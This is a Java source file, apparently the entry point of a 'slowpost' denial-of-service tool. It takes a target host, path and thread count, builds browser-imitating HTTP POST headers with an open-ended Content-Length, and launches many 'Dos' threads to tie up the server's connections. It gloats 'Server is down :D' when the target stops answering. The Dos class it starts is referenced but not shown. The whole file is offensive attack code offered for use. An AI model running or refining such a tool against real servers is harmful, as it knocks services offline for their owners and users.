
import java.net.ConnectException;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;

public class Main {
    private static String host;
    private static String ip;
    private static int port;
    public static String[] headers;

    public static void main(String[] args) throws Throwable {
        try {
            String file = "/" + args[1];
            try {
                String[] sp = args[0].split("[:]");
                host = sp[0];
                port = Integer.valueOf(sp[1]);
            } catch (Throwable t) {
                port = 80;
            }

            headers = new String[]
                    {
                            "POST " + file + " HTTP/1.1",
                            "Host: " + host,
                            "Connection: Keep-Alive",
                            "Accept: */*; q=0.01",
                            "Origin: http://" + host,
                            "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) "
                                    + "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
                            "DNT: 1",
                            "Accept-Encoding: gzip, deflate",
                            "Accept-Language: en-US",
                            "Content-Length: "
                    };

            for (int i = Integer.valueOf(args[2]); i > 0; i--) {
                new Dos().start();
            }
        } catch (Throwable t) {
            System.out.println("Invalid arguments.");
            System.out.println("Usage: java -jar slowpost.jar <host> <path> <threads>");
        }
    }

    public static Socket createNewSocket() {
        try {
            if (ip == null) {
                ip = InetAddress.getByName(host).getHostAddress();
            }
            return new Socket(ip, port);
        } catch (ConnectException ce) {
            System.out.println("Server is down :D");
        } catch (SocketException t) {
            System.exit(-1);
        } catch (Throwable t) {
            t.printStackTrace();
            System.exit(-1);
        }
        return null;
    }
}